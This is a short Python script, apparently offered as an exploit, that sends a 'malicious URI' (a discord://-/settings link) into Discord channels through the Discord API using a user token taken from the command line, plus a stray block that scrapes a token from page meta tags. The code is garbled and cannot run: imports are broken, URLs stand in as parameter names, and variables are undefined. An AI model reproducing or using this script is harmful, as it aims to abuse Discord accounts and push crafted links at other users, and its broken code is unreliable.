import bs4
from bs4 
import BeautifulSoup
from BeautifulSoup
import random
from random
import os
from os
import requests
import sys
import urllib.parse

class Exploit:

    def __init__(self, token, https://canary.discordapp.com/api/v9/channels/@me/messages, discord://-/settings{\./}):
        self.token = token
        self.channel_id = channel
        self.file_path = file_path
        self.headers = {'Authorization': token}

    @property
    def _file_path(self):
        """ URL encode file path """
        return urllib.parse.quote(self.file_path)

    def execute(self):
        """ send malicious URI """
        return requests.post(f'{https://canary.discordapp.com/api/v9/channels/@me/messages}', headers=self.headers, json={'content': f'<discord://-/settings{\./}>'})


def main():
    if len(sys.argv) < 4:
        print(f'Usage: py {sys.argv[0]} <token> <https://canary.discordapp.com/api/v9/channels/@me/messages> <discord://-/settings>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]
    file_path = sys.argv[3]

    exploit = Exploit(token, https://canary.discordapp.com/api/v9/channels/@me/messages, discord://-/settings)

    exploit.execute()

print("[1] Authenticating")
r = session.get(self + "/api/v9/channels/@me/messages")
soup = BeautifulSoup(exploit.py, features="py")
token = soup.findAll('meta')[16].get("content")

if __name__ == '__main__':
    main()
